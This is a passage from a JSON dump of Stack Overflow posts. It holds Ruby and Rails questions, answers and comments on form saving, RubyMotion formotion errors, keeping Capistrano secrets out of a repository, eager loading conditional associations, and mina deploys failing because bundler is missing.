form_for :up,:url=&gt; ups_path do |f| %&gt;\n&lt;%= f.collection_check_boxes :productplan_ids, Productplan.all, :id, \n:productplan_name %&gt;\n&lt;%= f.submit %&gt;\n&lt;% end %&gt;\n</code></pre>\n\n<p>Logs:</p>\n\n<pre><code>Started GET \"/ups\" for 127.0.0.1 at 2017-11-28 14:43:50 -0600\nProcessing by UpsController#index as HTML\nUser Load (1.6ms)  SELECT  \"users\".* FROM \"users\" WHERE \"users\".\"id\" = $1 \nORDER BY \"users\".\"id\" ASC LIMIT $2  [[\"id\", 3], [\"LIMIT\", 1]]\nRendering ups/index.html.erb within layouts/application\nProductplan Load (0.7ms)  SELECT \"productplans\".* FROM \"productplans\"\nRendered ups/_form.html.erb (42.5ms)\nRendered ups/index.html.erb within layouts/application (47.7ms)\nRendered _navbar.html.erb (0.9ms)\nCompleted 200 OK in 347ms (Views: 235.0ms | ActiveRecord: 15.0ms)\n\n\nStarted POST \"/ups\" for 127.0.0.1 at 2017-11-28 14:43:53 -0600\nProcessing by UpsController#create as HTML\nParameters: {\"utf8\"=&gt;\"\u2713\", \n\"authenticity_token\"=&gt;\"g7lLydleU7J14G7N9avWSK87E4BbkPQ9sdL\nQ9X2bbSCMmEvSL0LiiLgJbR81o5Hls7UrEjv9d7o+5pTFY9Ly8Q==\", \"up\"=&gt;\n{\"productplan_ids\"=&gt;[\"\", \"4\"]}, \"commit\"=&gt;\"Save Up\"}\nUser Load (1.0ms)  SELECT  \"users\".* FROM \"users\" WHERE \"users\".\"id\" = $1 \nORDER BY \"users\".\"id\" ASC LIMIT $2  [[\"id\", 3], [\"LIMIT\", 1]]\nProductplan Load (0.7ms)  SELECT \"productplans\".* FROM \"productplans\" WHERE \n\"productplans\".\"id\" = $1  [[\"id\", nil]]\n(0.4ms)  BEGIN\n(0.3ms)  COMMIT\nRendering ups/index.html.erb within layouts/application\nProductplan Load (0.6ms)  SELECT \"productplans\".* FROM \"productplans\"\nRendered ups/_form.html.erb (4.9ms)\nRendered ups/index.html.erb within layouts/application (7.9ms)\nRendered _navbar.html.erb (1.0ms)\nCompleted 200 OK in 201ms (Views: 183.4ms | ActiveRecord: 3.0ms)\n</code></pre>\n\n<p>route.rb</p>\n\n<pre><code>devise_scope :user do\n# write all your routes inside this block\nresources :productplan\nresources :ups\nend\n</code></pre>\n\n<p>There is still no data inserted in the Ups table , no error as well. Although according to log file it doesnt rollback but still the issue persists.</p>\n"}, {"tags": ["iphone", "ruby", "xcode", "rubymotion", "formotion"], "comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511892861, "post_id": 47537398, "comment_id": 82033499, "body": "Don\u2019t use the preinstalled ruby, install any ruby version manager (e.g. <a href=\"http://rvm.io\" rel=\"nofollow noreferrer\">rvm.io</a>) and install the exact version of ruby you\u2019ve used before OS update <i>within this package manager</i>."}, {"owner": {"reputation": 11, "user_id": 8980619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3d5bc1e6e738931d9016f6b8e0b8162?s=128&d=identicon&r=PG&f=1", "display_name": "hargett", "link": "https://stackoverflow.com/users/8980619/hargett"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511895351, "post_id": 47537398, "comment_id": 82034770, "body": "I have done this. I am using RVM with 2.0.0-247. Also all the gems seem to be in place"}], "answers": [{"tags": [], "owner": {"reputation": 11, "user_id": 8980619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3d5bc1e6e738931d9016f6b8e0b8162?s=128&d=identicon&r=PG&f=1", "display_name": "hargett", "link": "https://stackoverflow.com/users/8980619/hargett"}, "is_accepted": false, "score": 0, "last_activity_date": 1512149676, "creation_date": 1512149676, "answer_id": 47598608, "question_id": 47537398, "link": "https://stackoverflow.com/questions/47537398/ruby-problems-with-formotion-module/47598608#47598608", "title": "Ruby problems with formotion module", "body": "<p>There were a few gems required for the program that were not included in the code as gems that needed to be installed. The gems needed were:</p>\n\n<pre><code>    bigdecimal (1.2.0)\n  bubble-wrap (1.3.0)\n  bundler (1.16.0)\n  formotion (1.5.1)\n  io-console (0.4.2)\n  json (1.7.7)\n  minitest (4.3.2)\n  motion-csv (0.0.2)\n  motion-require (0.0.7)\n  motion-testflight (1.5)\n  psych (2.0.0)\n  rake (10.1.0, 0.9.6)\n  rdoc (4.0.0)\n  sugarcube (1.1.0)\n  test-unit (2.0.0.0)\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 8980619, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f3d5bc1e6e738931d9016f6b8e0b8162?s=128&d=identicon&r=PG&f=1", "display_name": "hargett", "link": "https://stackoverflow.com/users/8980619/hargett"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 27, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1512149676, "creation_date": 1511889537, "last_edit_date": 1511892937, "question_id": 47537398, "link": "https://stackoverflow.com/questions/47537398/ruby-problems-with-formotion-module", "title": "Ruby problems with formotion module", "body": "<p>There is an app written in ruby that I need to get running. It worked before IOS11 but is now throwing errors. I have formotion installed and all the appropriate gems and the SDK. I am having trouble getting the compiler to recognize that there is a formotion gem with things inside it.</p>\n\n<p>I am getting an uncaught exception \"Name Error\" and it says that the variable im trying to instantiate within the formotion class is an uninitialized constant. </p>\n\n<p>Any help with this error would be appreciated.</p>\n\n<p>Here are some bit of the code, the error points to <strong><code>row.text_field.resignFirstResponder</code></strong></p>\n\n<pre><code>module RowType\nclass PickerWithDoneRow &lt; PickerRow\n  include RowType::ItemsMapper\n\n  def after_build(cell)\n    super\n    keyboardDoneButtonView              = UIToolbar.new\n    keyboardDoneButtonView.barStyle     = UIBarStyleBlack\n    keyboardDoneButtonView.tintColor    = \"#000\".uicolor\n    keyboardDoneButtonView.translucent  = false\n    keyboardDoneButtonView.sizeToFit\n\n    # keyboardDoneButtonView.barTintColor = \"#BFC3C8\".uicolor\n    keyboardDoneButtonView.barTintColor = \"#EFEFF4\".uicolor\n\n    doneButton = UIBarButtonItem.alloc.initWithTitle(\"Done\", style:UIBarButtonItemStylePlain,  target:self, action: 'picker_done_clicked')\n    spacer1    = UIBarButtonItem.alloc.initWithBarButtonSystemItem(UIBarButtonSystemItemFlexibleSpace, target:self, action: nil)\n    spacer     = UIBarButtonItem.alloc.initWithBarButtonSystemItem(UIBarButtonSystemItemFlexibleSpace, target:self, action: nil)\n    keyboardDoneButtonView.setItems([spacer, spacer1, doneButton])\n\n    row.text_field.inputAccessoryView = keyboardDoneButtonView\n  end\n\n  def picker_done_clicked\n\n    row.text_field.resignFirstResponder\n  end\nend\nend\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "capistrano", "capistrano3"], "answers": [{"comments": [{"owner": {"reputation": 1999, "user_id": 5922350, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/FvLWu.png?s=128&g=1", "display_name": "KNejad", "link": "https://stackoverflow.com/users/5922350/knejad"}, "edited": false, "score": 0, "creation_date": 1511893353, "post_id": 47537524, "comment_id": 82033747, "body": "Hello Maxim, Yes I had considered this but I find it quite annoying to have environment variables for projects because 1) All developers working on the project have to add each environment variable for the project. 2) What if I have 2 projects I run locally? Now I have to have SSH_PROD_USER_PROJECT_NAME = &quot;username&quot; for each project to prevent them from conflicting."}, {"owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "reply_to_user": {"reputation": 1999, "user_id": 5922350, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/FvLWu.png?s=128&g=1", "display_name": "KNejad", "link": "https://stackoverflow.com/users/5922350/knejad"}, "edited": false, "score": 1, "creation_date": 1511893786, "post_id": 47537524, "comment_id": 82033953, "body": "Either way you do not want to have it in your source code since you want to make repository open. So you will have to share some sort of file with other developers working on this project. It could be whatever you want: requiring <code>secrets.yml</code>, <code>secret-bs.rb</code> or executing <code>env_variables_setter.sh</code>. It&#39;s up to you which way you want to make it accessible in deploy script. But I don&#39;t fully understand the need of putting deploy script in open repository at first. If someone will want use your app  maybe he should configure deploy by itself since the whole infrastructure will be different."}, {"owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "reply_to_user": {"reputation": 1999, "user_id": 5922350, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/FvLWu.png?s=128&g=1", "display_name": "KNejad", "link": "https://stackoverflow.com/users/5922350/knejad"}, "edited": false, "score": 0, "creation_date": 1511893867, "post_id": 47537524, "comment_id": 82034001, "body": "@KNejad And according your initial request, no I hadn&#39;t heard or seen any special capistrano plugins for those things. Either way it&#39;s pretty easy to do by requiring some sort of secret file."}], "tags": [], "owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "is_accepted": false, "score": 1, "last_activity_date": 1511889939, "creation_date": 1511889939, "answer_id": 47537524, "question_id": 47537329, "link": "https://stackoverflow.com/questions/47537329/how-to-store-secret-variables-in-capistrano/47537524#47537524", "title": "How to store secret variables in capistrano", "body": "<p>Environment variables might help you.\nYou can put <code>export SSH_PROD_USER=secret_user_name;</code> in your preferred shell profile. For example if you use bash then it would be <code>~.bash_profile</code>. Then use it in <code>production.rb</code> like this:</p>\n\n<p><code>server 'example.com', user: ENV['SSH_PROD_USER'], roles: %w{web app db}</code></p>\n\n<p>So basically ruby will have all your environment variables</p>\n"}, {"comments": [{"owner": {"reputation": 1999, "user_id": 5922350, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/FvLWu.png?s=128&g=1", "display_name": "KNejad", "link": "https://stackoverflow.com/users/5922350/knejad"}, "edited": false, "score": 0, "creation_date": 1511952280, "post_id": 47549238, "comment_id": 82058276, "body": "From some basic testing it doesn&#39;t seem like Capistranos&#39; <code>deploy.rb</code> file has access to the Figaro environment variables. Since Figaro only gets loaded when you run Rails, when you run <code>cap production deploy</code> on its own Figaro doesn&#39;t get run"}, {"owner": {"reputation": 616, "user_id": 2675376, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000498640121/picture?type=large", "display_name": "Juan Manuel Rodulfo Salcedo", "link": "https://stackoverflow.com/users/2675376/juan-manuel-rodulfo-salcedo"}, "reply_to_user": {"reputation": 1999, "user_id": 5922350, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/FvLWu.png?s=128&g=1", "display_name": "KNejad", "link": "https://stackoverflow.com/users/5922350/knejad"}, "edited": false, "score": 0, "creation_date": 1511968412, "post_id": 47549238, "comment_id": 82069093, "body": "I am not sure about that, It is suppose that any rake task lifts a fully environment but if it is the case you can use: <a href=\"https://apidock.com/rails/Rails/Application/config_for\" rel=\"nofollow noreferrer\">apidock.com/rails/Rails/Application/config_for</a>"}], "tags": [], "owner": {"reputation": 616, "user_id": 2675376, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000498640121/picture?type=large", "display_name": "Juan Manuel Rodulfo Salcedo", "link": "https://stackoverflow.com/users/2675376/juan-manuel-rodulfo-salcedo"}, "is_accepted": false, "score": 0, "last_activity_date": 1511947662, "creation_date": 1511947662, "answer_id": 47549238, "question_id": 47537329, "link": "https://stackoverflow.com/questions/47537329/how-to-store-secret-variables-in-capistrano/47549238#47549238", "title": "How to store secret variables in capistrano", "body": "<p>Use something like Figaro gem: <a href=\"https://github.com/laserlemon/figaro\" rel=\"nofollow noreferrer\">https://github.com/laserlemon/figaro</a></p>\n\n<p>and don't push to your repo your application.yml</p>\n\n<p>Or use an encrypted repo with credentials.</p>\n"}, {"tags": [], "owner": {"reputation": 10091, "user_id": 4625365, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/l6v41.jpg?s=128&g=1", "display_name": "Matt Brictson", "link": "https://stackoverflow.com/users/4625365/matt-brictson"}, "is_accepted": true, "score": 1, "last_activity_date": 1512071212, "creation_date": 1512071212, "answer_id": 47581475, "question_id": 47537329, "link": "https://stackoverflow.com/questions/47537329/how-to-store-secret-variables-in-capistrano/47581475#47581475", "title": "How to store secret variables in capistrano", "body": "<p>If your intention is to maintain your own deployment environment (which you keep secret) but open source the code of the application itself, then I would simply move the Capistrano-related files to a separate private repository. Then you can open source the app itself, but keep the Capistrano config private.</p>\n\n<p>There is no need for Capistrano's deploy.rb, etc. to live in the same directory structure or even the same repository as the app that is being deployed. After all, Capistrano deploys based on the <code>:repo_url</code>, which can be anything. It doesn't have to match repo where Capistrano's files are kept.</p>\n\n<p>If you want to give other people (i.e. those that fork/clone the app) the ability to deploy to their own infrastructure, perhaps the easiest solution is to write up a wiki page explaining how they can set up their own Capistrano config. Deployment environments can vary widely and therefore it is probably not something you can do simply with environment variables or encrypted secrets.</p>\n\n<p>In any case make sure you audit and rewrite your Git history if necessary to make sure you won't be leaking any sensitive config when you make the repo public.</p>\n"}], "owner": {"reputation": 1999, "user_id": 5922350, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/FvLWu.png?s=128&g=1", "display_name": "KNejad", "link": "https://stackoverflow.com/users/5922350/knejad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 590, "favorite_count": 0, "accepted_answer_id": 47581475, "answer_count": 3, "score": 1, "last_activity_date": 1512071212, "creation_date": 1511889304, "question_id": 47537329, "link": "https://stackoverflow.com/questions/47537329/how-to-store-secret-variables-in-capistrano", "title": "How to store secret variables in capistrano", "body": "<p>I am writing a Rails app with automated deployment using Capistrano. In the deploy.rb script I have:</p>\n\n<p><code>set :deploy_to, '/my/deploy/path/'</code></p>\n\n<p>And in production.rb I have:</p>\n\n<p><code>server 'example.com', user: 'secret_user_name', roles: %w{web app db}</code></p>\n\n<p>Currently the app is private. But assume I wanted an open source app like this. Then I wouldn't want <code>secret_user_name</code> and <code>/my/deploy/path</code> to be stored in the repo. In the Rails project if I encountered an issue like this I would store the secret values in <code>secrets.yml</code> and access them from there. However I don't have access to <code>secrets.yml</code> from Capistrano. So I could manually load the secrets file but I'm sure there is a better way to do this.</p>\n\n<p>So my question is: How can I have an automated deployment process without exposing server information using Capistrano? Is there a recommended way to store secrets like there is in Rails?</p>\n"}, {"tags": ["ruby", "ruby-on-rails-4"], "answers": [{"tags": [], "owner": {"reputation": 597, "user_id": 4298591, "user_type": "registered", "accept_rate": 89, "profile_image": "https://lh6.googleusercontent.com/-aXlKvLEDX-I/AAAAAAAAAAI/AAAAAAAAIZY/F9Rj1oGuE1Y/photo.jpg?sz=128", "display_name": "Benjamin", "link": "https://stackoverflow.com/users/4298591/benjamin"}, "is_accepted": true, "score": 1, "last_activity_date": 1511888706, "creation_date": 1511888706, "answer_id": 47537148, "question_id": 47536579, "link": "https://stackoverflow.com/questions/47536579/eager-loading-with-conditional-has-many-results-in-unknown-column-error/47537148#47537148", "title": "Eager Loading with Conditional has_many results in Unknown Column Error", "body": "<p>I was able to get it working by adding a references.</p>\n\n<p>So instead of doing: </p>\n\n<pre><code>ModelD.includes(:correct_model_Fs, :incorrect_model_Fs, model_c: [model_b: [:model_a]]).all\n</code></pre>\n\n<p>I am doing:</p>\n\n<pre><code>ModelD.includes(:correct_model_Fs, :incorrect_model_Fs, model_c: [model_b: [:model_a]]).references(:model_f).all\n</code></pre>\n\n<p>Which produces a single SQL query.</p>\n"}], "owner": {"reputation": 597, "user_id": 4298591, "user_type": "registered", "accept_rate": 89, "profile_image": "https://lh6.googleusercontent.com/-aXlKvLEDX-I/AAAAAAAAAAI/AAAAAAAAIZY/F9Rj1oGuE1Y/photo.jpg?sz=128", "display_name": "Benjamin", "link": "https://stackoverflow.com/users/4298591/benjamin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 47537148, "answer_count": 1, "score": 0, "last_activity_date": 1511888706, "creation_date": 1511886966, "question_id": 47536579, "link": "https://stackoverflow.com/questions/47536579/eager-loading-with-conditional-has-many-results-in-unknown-column-error", "title": "Eager Loading with Conditional has_many results in Unknown Column Error", "body": "<p>I have 6 models: Model A, Model B, Model C, Model D, Model E, and Model F.</p>\n\n<blockquote>\n  <p>Model <strong>A</strong> has many Model <strong>B</strong>'s.</p>\n  \n  <p>Model <strong>B</strong> has many Model <strong>C</strong>'s. </p>\n  \n  <p>Model <strong>C</strong> has many Model <strong>D</strong>'s. </p>\n  \n  <hr>\n  \n  <p>Model <strong>D</strong> has many Model <strong>E</strong>'s. </p>\n  \n  <p>Model <strong>D</strong> has many Model <strong>F</strong>'s through Model <strong>E</strong>. </p>\n  \n  <hr>\n  \n  <p>Model <strong>F</strong> has many Model <strong>E</strong>'s. </p>\n  \n  <p>Model <strong>F</strong> has many Model <strong>D</strong>'s through Model <strong>E</strong>.</p>\n  \n  <p>Model <strong>F</strong> has a <strong>boolean</strong> column called <strong>correct</strong></p>\n</blockquote>\n\n<p>In my model <strong>D</strong> I have associations called <strong>correct_model_Fs</strong> and <strong>incorrect_model_Fs</strong>.</p>\n\n<p>They look like so:</p>\n\n<pre><code>has_many :correct_model_Fs, -&gt; { where(correct: true) }, through: :model_E, source: :model_f\nhas_many :incorrect_model_Fs, -&gt; { where(correct: false) }, through: :model_E, source: :model_f\n</code></pre>\n\n<p>Without eager loading, I can perform everything that I need to.</p>\n\n<p>But I need to make things more efficient. In my controller I am trying to get all of the Model D's and eager load everything, essentially. I first tried:</p>\n\n<pre><code>ModelD.includes(:correct_model_Fs, :incorrect_model_Fs, model_c: [model_b: [:model_a]]).all\n</code></pre>\n\n<p>But as soon as I add eager loading. I run into this error: </p>\n\n<pre><code>SQLite3::SQLException: no such column: model_F.correct: \nSELECT \"model_E\".* FROM \"model_E\" \nWHERE \"model_F\".\"correct\" = ? AND \"model_E\".\"model_D_id\" IN (1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78)\n</code></pre>\n\n<p>I attempted to do a join:\n  ModelD.includes(model_c: [model_b: [:model_a]]).joins(:correct_model_Fs, :incorrect_model_Fs).all</p>\n\n<p>which prevents the crash, but I don't actually get any of the information that I want. And no Model D's are given.</p>\n\n<p>How can I make sure that everything is properly eagerly loaded with these conditions?</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "deployment", "digital-ocean"], "comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 1, "creation_date": 1511886103, "post_id": 47536104, "comment_id": 82029353, "body": "I&#39;m a little rusty on this particular set of tools, but looking at the error it appears <code>Invoke bundle:install (first_time)</code> needs to also <code>gem install bundler</code>, before running <code>bundle install</code>."}, {"owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "edited": false, "score": 0, "creation_date": 1511887498, "post_id": 47536104, "comment_id": 82030268, "body": "Make sure bundle is installed on the server machine. Use command <code>bundle -v</code> to make sure it is."}, {"owner": {"reputation": 113, "user_id": 2657566, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/3778b178758cde9deab511a0b867f08a?s=128&d=identicon&r=PG", "display_name": "Krishna Teja Karnam", "link": "https://stackoverflow.com/users/2657566/krishna-teja-karnam"}, "reply_to_user": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "edited": false, "score": 0, "creation_date": 1511888049, "post_id": 47536104, "comment_id": 82030582, "body": "@MaximPontyushenko Bundler is installed. In the process of configuring mina gem, am able to install all the gems in the vps. When I input the command <code>mina deploy</code> it does the tasks as mentioned in the question(above) one by one and one. Am getting the error then. And this is the bunlder version <code>Bundler version 1.16.0</code>"}, {"owner": {"reputation": 113, "user_id": 2657566, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/3778b178758cde9deab511a0b867f08a?s=128&d=identicon&r=PG", "display_name": "Krishna Teja Karnam", "link": "https://stackoverflow.com/users/2657566/krishna-teja-karnam"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511888221, "post_id": 47536104, "comment_id": 82030699, "body": "@TomLord This is my deploy.rb file <a href=\"https://github.com/krishnateja/rails-demo/blob/master/config/deploy.rb\" rel=\"nofollow noreferrer\">deploy.rb</a> any idea how can I incorporate gem install bundler near line no.31. I tried this command <code>%{command gem install bundler}</code> but no luck."}, {"owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "edited": false, "score": 0, "creation_date": 1511888350, "post_id": 47536104, "comment_id": 82030787, "body": "@KrishnaTejaKarnam go to <code>139.59.72.156</code> by ssh and install bundle in it."}, {"owner": {"reputation": 113, "user_id": 2657566, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/3778b178758cde9deab511a0b867f08a?s=128&d=identicon&r=PG", "display_name": "Krishna Teja Karnam", "link": "https://stackoverflow.com/users/2657566/krishna-teja-karnam"}, "reply_to_user": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "edited": false, "score": 0, "creation_date": 1511888720, "post_id": 47536104, "comment_id": 82031049, "body": "@MaximPontyushenko Thats not the problem. I did <code>bundle</code>, its working fine. When I automate the process with <code>mina</code> thats when something is breaking."}, {"owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "edited": false, "score": 0, "creation_date": 1511888946, "post_id": 47536104, "comment_id": 82031183, "body": "@KrishnaTejaKarnam Maybe it&#39;s because you installed bundler under user other than <code>root</code> you use in deploy configuration. I believe you have to change ownership of the deploy path to <code>rails</code> user and make deployment by this user also. Also make sure that bundler is available for rails user on your server."}, {"owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "edited": false, "score": 0, "creation_date": 1511889134, "post_id": 47536104, "comment_id": 82031306, "body": "@KrishnaTejaKarnam I guess it&#39;s impossible that bundler is available when you connect by ssh to server and unavailable when you do the very same thing by running deploy script. Under the hood it connects via ssh and uses the same environment as when you connect manually."}, {"owner": {"reputation": 113, "user_id": 2657566, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/3778b178758cde9deab511a0b867f08a?s=128&d=identicon&r=PG", "display_name": "Krishna Teja Karnam", "link": "https://stackoverflow.com/users/2657566/krishna-teja-karnam"}, "reply_to_user": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "edited": false, "score": 0, "creation_date": 1511890220, "post_id": 47536104, "comment_id": 82031954, "body": "@MaximPontyushenko Looks like its a well known issue. I raised a issue on the repo. I will update, if I get any thing."}, {"owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "edited": false, "score": 0, "creation_date": 1511890492, "post_id": 47536104, "comment_id": 82032143, "body": "@KrishnaTejaKarnam hope you will find more help there!"}], "answers": [{"comments": [{"owner": {"reputation": 113, "user_id": 2657566, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/3778b178758cde9deab511a0b867f08a?s=128&d=identicon&r=PG", "display_name": "Krishna Teja Karnam", "link": "https://stackoverflow.com/users/2657566/krishna-teja-karnam"}, "edited": false, "score": 0, "creation_date": 1511888858, "post_id": 47537144, "comment_id": 82031136, "body": "Buddy you are missing my point. Please check my comments above."}], "tags": [], "owner": {"reputation": 2607, "user_id": 4470392, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CvLjT.jpg?s=128&g=1", "display_name": "Maxim Pontyushenko", "link": "https://stackoverflow.com/users/4470392/maxim-pontyushenko"}, "is_accepted": false, "score": 0, "last_activity_date": 1511888698, "creation_date": 1511888698, "answer_id": 47537144, "question_id": 47536104, "link": "https://stackoverflow.com/questions/47536104/mina-deploy-throws-error-bundle-command-not-found-error-deploy-failed/47537144#47537144", "title": "mina deploy throws error - bundle: command not found ! ERROR: Deploy failed", "body": "<p>Bundler has to be installed on your server machine (the one you trying to deploy to). The easiest way is to login into it by ssh and run <code>gem install bundler</code> once. It's listed as a common question in <a href=\"https://github.com/mina-deploy/mina/blob/992ddb7ac655924264a99b68d4a1a6078e4b858c/docs/faq.md#--command-not-found-bundle\" rel=\"nofollow noreferrer\">official mina FAQ</a></p>\n"}, {"tags": [], "owner": {"reputation": 1061, "user_id": 1651458, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/DQZz9.jpg?s=128&g=1", "display_name": "Sam", "link": "https://stackoverflow.com/users/1651458/sam"}, "is_accepted": false, "score": 0, "last_activity_date": 1515059715, "creation_date": 1515059715, "answer_id": 48092716, "question_id": 47536104, "link": "https://stackoverflow.com/questions/47536104/mina-deploy-throws-error-bundle-command-not-found-error-deploy-failed/48092716#48092716", "title": "mina deploy throws error - bundle: command not found ! ERROR: Deploy failed", "body": "<p>I have this issue as well, and workaround it by moving my launch tasks to a separate task. So you could do this by turning</p>\n\n<pre><code>task :deploy do\n  deploy do\n    comment \"Deploying #{fetch(:application_name)} to #{fetch(:domain)}:#{fetch(:deploy_to)}\"\n    invoke :'git:clone'\n    invoke :'deploy:link_shared_paths'\n    invoke :'bundle:install'\n    invoke :'rails:db_migrate'\n    invoke :'rails:assets_precompile'\n    invoke :'deploy:cleanup'\n\n    on :launch do\n      invoke :'puma:phased_restart'\n    end\n  end\n\nend\n</code></pre>\n\n<p>to</p>\n\n<pre><code>task :deploy do\n  deploy do\n    comment \"Deploying #{fetch(:application_name)} to #{fetch(:domain)}:#{fetch(:deploy_to)}\"\n    invoke :'git:clone'\n    invoke :'deploy:link_shared_paths'\n    invoke :'bundle:install'\n    invoke :'rails:db_migrate'\n    invoke :'rails:assets_precompile'\n    invoke :'deploy:cleanup'\n  end\nend\n\ntask :launch do\n  invoke :'puma:phased_restart'\nend\n</code></pre>\n\n<p>And then execute it separately (which is admittedly suboptimal):</p>\n\n<pre><code>$ mina deploy\n$ mina launch\n</code></pre>\n\n<p>I don't know the particulars of your task, but I configure mine like so:</p>\n\n<pre><code>task :launch =&gt; :remote_environment do\n  in_path(fetch(:current_path)) do\n    invoke :'my:task'\n  end\nend\n</code></pre>\n\n<p>I know this isn't a solution or explanation, but hopefully it helps.</p>\n"}, {"tags": [], "owner": {"reputation": 3786, "user_id": 3698961, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/0Kj2n.jpg?s=128&g=1", "display_name": "ahbou", "link": "https://stackoverflow.com/users/3698961/ahbou"}, "is_accepted": false, "score": 0, "last_activity_date": 1590059926, "creation_date": 1590059926, "answer_id": 61933327, "question_id": 47536104, "link": "https://stackoverflow.com/questions/47536104/mina-deploy-throws-error-bundle-command-not-found-error-deploy-failed/61933327#61933327", "title": "mina deploy throws error - bundle: command not found ! ERROR: Deploy failed", "body": "<p>For me the issue was with 